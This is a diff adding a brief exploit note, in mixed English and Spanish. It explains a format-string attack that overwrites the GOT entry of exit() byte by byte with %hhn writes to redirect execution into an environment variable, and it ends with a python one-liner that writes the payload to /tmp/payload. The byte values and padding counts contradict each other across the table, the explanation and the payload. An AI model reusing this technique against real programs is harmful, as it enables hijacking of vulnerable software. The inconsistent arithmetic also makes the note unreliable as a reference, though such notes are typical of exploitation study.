@@ -1,0 +1,33 @@
+Let's say that our Env Var address is 0xffffd8c2
+we'll add ~16 to it, cause it's secure
+0xffffd8c2 + 16 = 0xffffd8d2
+
+Then we have the destiny GOT de exit = 0x80497e0
+
+Dirección GOT	    Byte a escribir	    En decimal
+0x80497e0	            0xd2	            199
+0x80497e1	            0xd8	            216
+0x80497e2	            0xff	            255
+0x80497e3	            0xff	            255
+
+We start by entering the 4 destination addresses (16 bytes). 
+Then fill in the rest with %Ni to increment the counter to the 
+value immediately before each write:
+There are 16 characters (the addresses).
+
+To reach 210: 210 - 16 = 194 remains → %194i, then write the byte 0xc7.
+
+To reach 216: you need 216 - 210 = 6 → %6i, then write 0xd8.
+
+To reach 255: you need 255 - 216 = 39 → %39i, then write 0xff (twice, in bytes 2 and 3).
+
+python -c 'print \
+"\xe0\x97\x04\x08" + \
+"\xe1\x97\x04\x08" + \
+"\xe2\x97\x04\x08" + \
+"\xe3\x97\x04\x08" + \
+"%183i" + "%10$hhn" + \
+"%17i"  + "%11$hhn" + \
+"%39i"  + "%12$hhn" + "%13$hhn"' > /tmp/payload
+
+Remember to use %Nc instead %Ni if onlu 1 char will be printed
